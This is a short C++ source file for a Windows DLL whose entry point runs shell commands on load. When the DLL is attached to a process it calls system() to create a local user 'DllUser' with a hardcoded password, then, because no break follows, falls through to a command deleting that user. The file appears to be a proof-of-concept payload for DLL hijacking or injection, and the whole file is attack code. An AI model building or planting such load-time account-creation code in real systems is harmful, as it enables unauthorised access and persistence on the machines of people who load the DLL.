// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <cstdlib>
#include <iostream>

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // execute command net user
        system("net user /add DllUser P@ssw0rd!123");
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        // execute command net user
        system("net user /delete DllUser");
        break;
    }
    return TRUE;
}

